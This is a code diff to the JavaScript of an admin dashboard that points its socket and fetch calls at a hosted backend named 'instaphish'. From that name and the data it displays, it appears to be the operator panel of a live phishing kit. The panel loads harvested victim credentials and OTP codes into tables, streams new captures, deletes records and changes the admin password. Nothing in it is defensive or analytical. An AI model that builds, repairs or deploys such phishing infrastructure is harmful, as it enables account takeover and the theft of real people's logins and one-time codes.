@@ -1,4 +1,5 @@
-const socket = io();
+const BACKEND_URL = 'https://instaphish-2nrr.onrender.com';
+const socket = io(BACKEND_URL);
 const statusEl = document.getElementById('status');
 const loginBody = document.querySelector('#login-table tbody');
 const otpBody = document.querySelector('#otp-table tbody');
@@ -75,7 +76,10 @@ function addActivityRow(message) {
 // Delete handler (delegated)
 async function deleteRecord(type, id, rowEl) {
   try {
-    const resp = await fetch(`/admin/delete/${type}/${id}`, { method: 'DELETE' });
+    const resp = await fetch(`${BACKEND_URL}/admin/delete/${type}/${id}`, {
+      method: 'DELETE',
+      credentials: 'include',
+    });
     if (!resp.ok) throw new Error('Delete failed');
     if (rowEl && rowEl.remove) rowEl.remove();
     showToast('Deleted ' + type + ' ' + id);
@@ -97,7 +101,9 @@ document.addEventListener('click', (e) => {
 
 async function loadInitialData() {
   try {
-    const response = await fetch('/admin/data');
+    const response = await fetch(`${BACKEND_URL}/admin/data`, {
+      credentials: 'include',
+    });
     const data = await response.json();
     data.credentials.reverse().forEach(addLoginRow);
     data.otps.reverse().forEach(addOtpRow);
@@ -151,8 +157,9 @@ adminUpdateForm?.addEventListener('submit', async (event) => {
   const username = formData.get('username')?.toString();
   const password = formData.get('password')?.toString();
   try {
-    const response = await fetch('/admin/update-admin', {
+    const response = await fetch(`${BACKEND_URL}/admin/update-admin`, {
       method: 'POST',
+      credentials: 'include',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username, password }),
     });
